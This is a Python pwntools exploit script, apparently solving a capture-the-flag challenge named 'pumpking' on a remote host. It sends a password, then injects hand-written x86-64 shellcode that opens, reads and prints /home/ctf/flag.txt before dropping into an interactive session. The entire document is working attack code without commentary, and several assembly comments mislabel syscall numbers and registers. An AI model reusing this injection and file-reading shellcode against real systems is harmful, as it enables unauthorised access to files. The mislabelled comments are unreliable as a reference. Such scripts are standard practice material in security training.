#!/usr/bin/env python3

from pwn import *

pwn = './pumpking'
context.terminal = 'kitty'
gdbscript='''
b king
continue
'''
host,port = '139.59.167.169', 31564

def conn():
	if args.REMOTE:
		return remote(host,port)
	elif args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

io = conn()
io.recvuntil(b'kids: ')
io.send(b'pumpk1ngRulez\n')
io.recvuntil(b'>> ')

shellcode = asm('''
.global _start;\
_start:;\
.intel_syntax noprefix;\

push 1
pop r8

push 1
dec byte ptr [rsp]
mov rax, 0x7478
push rax
mov rax, 0x742e67616c662f66
push rax
mov rax, 0x74632f656d6f682f
push rax

push SYS_openat /* 2 */
pop rax
mov rsi, rsp
xor edi, edi /* O_RDONLY */
xor rcx,rcx
xor rdx,rdx
syscall

mov rbx, rax

/* call read('rbx', 'rbp-0x20', 20) */
push SYS_read /* 5 */
lea rax,[rbp-0x20]
mov edx, 50
mov rdi, rbx
mov rsi, rax
pop rax
syscall

push SYS_write
lea rax,[rbp-0x20]
mov edx, 50
mov edi, 1
mov rsi, rax
pop rax
syscall''' , arch = 'amd64', os = 'linux')
io.send(shellcode)
io.interactive()